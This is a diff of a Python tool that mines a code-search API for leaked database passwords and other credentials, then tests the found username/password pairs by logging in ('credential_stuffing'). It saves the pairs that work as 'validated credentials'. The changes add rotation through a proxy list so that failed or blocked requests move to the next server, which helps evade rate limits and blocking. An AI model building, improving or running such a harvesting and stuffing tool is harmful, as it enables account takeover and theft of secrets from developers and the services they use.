@@ -2,7 +2,6 @@
 
 import ast
 import itertools
-import json
 import os
 import re
 import requests
@@ -10,6 +9,7 @@ import string
 import sys
 import time
 from requests.adapters import HTTPAdapter
+from requests.exceptions import ProxyError
 from typing import Callable, Iterable, TextIO, Tuple
 from urllib3.util.retry import Retry
 
@@ -21,19 +21,20 @@ HEADERS = {
 }
 
 
-def validate_login(*auth: Tuple[str, str], pause=60) -> bool:
+def validate_login(*auth: Tuple[str, str]) -> bool:
     'Try to login with the username and password.'
     auth = tuple(s.encode('utf-8') for s in auth)
-    codes = {
-        200: True,
-        401: False,
-    }
+    if not hasattr(validate_login, 'proxy_list'):
+        validate_login.proxy_list = itertools.repeat('')
     while True:
-        code = requests.get(API, auth=auth).status_code
-        if code in codes:
-            return codes[code]
-        progress('!')
-        time.sleep(pause)
+        if not hasattr(validate_login, 'proxy'):
+            validate_login.proxy = {'https': next(validate_login.proxy_list)}
+        try:
+            response = requests.get(API, auth=auth, proxies=validate_login.proxy)
+            return {200: True, 401: False}[response.status_code]
+        except (ProxyError, KeyError) as e:
+            progress('!')
+        del validate_login.proxy  # move to the next proxy server in the list
 
 
 def search_code(keywords: str, pause=10) -> Iterable[dict]:
@@ -42,8 +43,8 @@ def search_code(keywords: str, pause=10) -> Iterable[dict]:
         params = dict(q=keywords, page=i)
         progress(';')
         time.sleep(pause)
-        r = requests.get(API + '/search/code', params, headers=HEADERS)
-        result = json.loads(r.text)
+        response = requests.get(API + '/search/code', params, headers=HEADERS)
+        result = response.json()
         items = result.get('items')
         if items:
             yield from items
@@ -125,19 +126,18 @@ def set_retry_strategy(prefix='https://', *args, **kwargs):
 
 def main(patterns: Iterable[Tuple], file: TextIO):
     'Print validated credentials.'
-    if ENV_VAR not in os.environ:
-        print('Please provide your %s as an environment variable.' % ENV_VAR)
-        return
-
-    set_retry_strategy(backoff_factor=1)
     for pattern in patterns:
         for user, password in credential_stuffing(*pattern):
             print(user, password, file=file)
         print(file=file)
 
 
-if __name__ == '__main__':
-    path = sys.argv[1] if len(sys.argv) > 1 else 'leaked.txt'
+def initialize():
+    'Load the configuration from environment variables.'
+    if ENV_VAR not in os.environ:
+        print('Please provide your %s as an environment variable.' % ENV_VAR)
+        return
+
     tld = '''
         . com org net edu gov me io tk azure amazonaws hostinger
         ru cn com.cn edu.cn tw hk com.hk edu.hk jp co.jp ne.jp in
@@ -147,5 +147,13 @@ if __name__ == '__main__':
         i + ' define DB_PASSWORD': find_php_db_password
         for i in tld
     }
-    with open(path, 'a', 1, 'utf-8') as f:
+
+    set_retry_strategy(backoff_factor=1)
+    with open(os.environ.get('PROXIES', 'proxies.txt'), encoding='utf-8') as f:
+        validate_login.proxy_list = itertools.cycle(f.read().split())
+    with open(os.environ.get('RESULTS', 'results.txt'), 'a', 1, 'utf-8') as f:
         main(patterns.items(), f)
+
+
+if __name__ == '__main__':
+    initialize()
